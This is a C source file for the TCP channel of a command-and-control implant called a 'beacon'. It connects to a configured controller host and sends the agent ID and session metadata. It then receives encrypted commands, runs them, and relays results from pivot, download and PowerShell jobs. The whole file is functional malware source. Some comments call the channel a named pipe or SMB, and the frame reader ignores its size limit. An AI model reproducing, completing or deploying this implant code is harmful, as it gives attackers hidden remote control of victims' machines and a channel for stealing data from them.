/* 
 * Manage the TCP channel
 */
#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"

#define MAX_GET 1024 * 1024

static SOCKET server           = INVALID_HANDLE_VALUE;
static char * tcp_write_buffer = NULL;
static int    tcp_write_len    = 0;
static char * tcp_read_buffer  = NULL;

extern unsigned int post_type;
extern unsigned int agentid;
extern sessdata bigsession;
extern unsigned int sleep_time;

SOCKET wsconnect(char * targetip, int port);
void tcp_flush();

/* send a frame via a socket */
void send_frame(SOCKET my_socket, char * buffer, int length) {
	send(my_socket, (char *)&length, 4, 0);
	send(my_socket, buffer, length, 0);
}

/* receive a frame from a socket */
DWORD recv_frame(SOCKET my_socket, char * buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;

	/* read the 4-byte length */
	recv(my_socket, (char *)&size, 4, 0);

	/* read in the result */
	while (total < size) {
		temp = recv(my_socket, buffer + total, size - total, 0);
		total += temp;
	}
	return size;
}

/* init our connection */
BOOL tcp_init() {
	/* alloc our data */
	tcp_write_buffer = (char *)malloc(MAX_GET);
	tcp_write_len = 0;

	/* set post type to POST_TCP now... since everything seems OK */
	post_type = POST_TCP;

	/* init our winsock socket */
	channel_winsock_init();

	/* connect! */
	server = wsconnect(setting_ptr(SETTING_DOMAINS), setting_short(SETTING_PORT));
	if (server == INVALID_SOCKET)
		return FALSE;

	/* send metadata + agent ID, please */
	memcpy(tcp_write_buffer, &agentid, sizeof(unsigned int));
	memcpy(tcp_write_buffer + sizeof(unsigned int), bigsession.data, bigsession.length);
	send_frame(server, tcp_write_buffer, bigsession.length + sizeof(unsigned int));
	
	return TRUE;
}

/*
 *  kill our named pipe (done)
 */
void tcp_stop() {
	/* do the right thing for our TCP socket */
	closesocket(server);

	/* free up some of our data */
	tcp_write_len = 0;

	/* free our datarz */
	if (tcp_write_buffer != NULL)
		free(tcp_write_buffer);

	if (tcp_read_buffer != NULL)
		free(tcp_read_buffer);

	tcp_write_buffer = NULL;
	tcp_read_buffer  = NULL;
}

/*
 * write data to our named pipe 
 */
void tcp_write(char * buffer, int len) {
	unsigned int flen = 0;
	int length = 0;
	int mustread = 0;

	/* sanity check to make sure we're not sending an obscenely sized file */
	if ((len + sizeof(unsigned int)) > MAX_GET) {
		/* this message is too big, no way in hell! */
		return;
	}
	/* if we're be too big, go ahead and make a post now */
	else if ((tcp_write_len + len + sizeof(unsigned int)) > MAX_GET) {
		/* we're too big... sooo.... let's flush */
		tcp_flush();
		/* we f'd up read/write loop, so let's flag that we need to do a read */
		mustread = 1;
	}

	/* if we're not too big, let's append our length and data */
	flen = htonl(len);
	memcpy((void *)(tcp_write_buffer + tcp_write_len), (void *)&flen, sizeof(unsigned int));
	tcp_write_len += sizeof(unsigned int);

	/* now, let's append our data to post */
	memcpy((void *)(tcp_write_buffer + tcp_write_len), buffer, len);
	tcp_write_len += len;

	/* SMB loop assumes READ, WRITE, READ, etc. - we do a read here to put loop back on track */
	if (mustread == 1) {
		/* read from the connection */
		length = recv_frame(server, tcp_read_buffer, MAX_GET);
		if (length > 1) {
			length = security_decrypt(tcp_read_buffer, length);
			if (length > 0) {
				process_payload(tcp_read_buffer, length);
			}
		}
	}
}

/* 
 * post our data back
 */
void tcp_flush() {
	if (tcp_write_len > 0) {
		send_frame(server, (void *)tcp_write_buffer, tcp_write_len);
	}
	else {
		send_frame(server, (void *)tcp_write_buffer, 1);
	}

	tcp_write_len = 0;
}

void tcp_process() {
	int length = 0;

	if (tcp_read_buffer == NULL)
		tcp_read_buffer = (char *)malloc(MAX_GET);

	while (TRUE) {
		/* read from the connection */
		length = recv_frame(server, tcp_read_buffer, MAX_GET);
		if (length < 0) {
			return;
		}	

		if (length > 1) {
			length = security_decrypt(tcp_read_buffer, length);
			if (length > 0) {
				process_payload(tcp_read_buffer, length);
			}
		}

		pivot_poll(command_shell_callback);
		download_poll(command_shell_callback, MAX_PACKET / 2);
		link_poll(command_shell_callback);
		psh_poll(command_shell_callback, MAX_PACKET);

		/* check the kill date */
		if (check_kill_date())
			command_die(command_shell_callback);

		tcp_flush();

		if (sleep_time == 0)
			return;
	}
}

/*
 * put this beacon into a mode where it's waiting for a connection to its pipe
 */
void command_tcp_start() {
	/* setup our SMB server */
	if (!tcp_init()) {
		return;
	}

	/* process data */
	tcp_process();

	/* OK, time to shut it down */
	tcp_stop();

	/* just kill the process... it's this or crash */
	safe_exit();
}